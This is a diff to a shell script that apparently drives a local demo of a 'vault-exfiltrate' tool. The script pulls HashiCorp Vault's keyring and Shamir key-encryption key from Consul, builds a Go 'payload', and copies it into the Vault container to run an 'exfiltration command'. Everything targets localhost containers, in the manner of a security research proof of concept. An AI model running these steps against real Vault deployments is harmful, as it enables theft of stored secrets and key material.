@@ -25,6 +25,7 @@ echo "sleep for 15"
 sleep 15
 
 export VAULT_ADDR=http://127.0.0.1:8200 
+export CONSUL_HTTP_ADDR=http://127.0.0.1:8500 
 
 echo "Vault status:"
 vault status
@@ -44,17 +45,17 @@ vault operator unseal $VAULT_UNSEAL_KEY
 echo "use consul to get keyring"
 consul members
 consul kv get -base64 vault/core/keyring | base64 -d > keyring_file
-docker cp keyring_file vault-exfiltrate-vault-1:/keyring_file
+docker cp keyring_file vault:/keyring_file
 consul kv get -base64 vault/core/shamir-kek >shamir-kek.b64
 cat shamir-kek.b64 | base64 -d > shamir-kek-decoded
-docker cp shamir-kek-decoded vault-exfiltrate-vault-1:/shamir-kek-decoded
+docker cp shamir-kek-decoded vault:/shamir-kek-decoded
 
 echo "preparing payload to get data"
 go mod vendor
 GOOS=linux go build
-docker cp vault-exfiltrate vault-exfiltrate-vault-1:/vault-exfiltrate 
-docker cp exec.sh vault-exfiltrate-vault-1:/exec.sh
+docker cp vault-exfiltrate vault:/vault-exfiltrate 
+docker cp exec.sh vault:/exec.sh
 
 echo "Execute first exfiltration command"
-docker exec -i  vault-exfiltrate-vault-1 /bin/sh -C ./exec.sh
+docker exec -i  vault /bin/sh -C ./exec.sh
 
